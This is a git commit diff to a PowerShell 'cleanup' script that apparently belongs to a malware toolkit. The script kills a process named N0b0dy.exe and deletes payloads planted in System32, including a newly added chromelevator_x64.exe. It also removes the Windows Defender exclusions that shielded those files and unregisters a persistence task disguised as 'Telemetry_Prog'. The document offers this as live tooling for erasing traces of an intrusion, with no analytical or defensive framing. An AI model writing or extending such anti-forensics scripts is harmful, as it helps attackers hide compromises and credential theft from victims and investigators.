4d8f559f3506e6ff78235a6916f5c8052b4d38c2
Kylerainer09 <Mr.nobodyAl22SU@proton.me>
2025-11-29 06:12:02 +0000

    Update cleanup1.ps1

--- cleanup1.ps1
+++ cleanup1.ps1
@@ -4,9 +4,11 @@ Stop-Process -Name "N0b0dy.exe" -Force
 Remove-Item -Path "C:\Windows\System32\N0body.exe" -Force
 Remove-Item -Path "C:\Windows\System32\temp.ps1" -Force
 Remove-Item -Path "C:\Windows\System32\ddrcc.ps1" -Force
+Remove-Item -Path "C:\Windows\System32\chromelevator_x64.exe" -Force
 # remove exclusions
 Remove-MpPreference -ExclusionPath "C:\Windows\System32\N0body.exe" -Force
 Remove-MpPreference -ExclusionPath "C:\Windows\System32\temp.ps1" -Force
+Remove-MpPreference -ExclusionPath "C:\Windows\System32\chromelevator_x64.exe" -Force
 # removes scheduled task
 Unregister-ScheduledTask -TaskName "Telemetry_Prog" -Confirm:$false
 # start final cleanup file
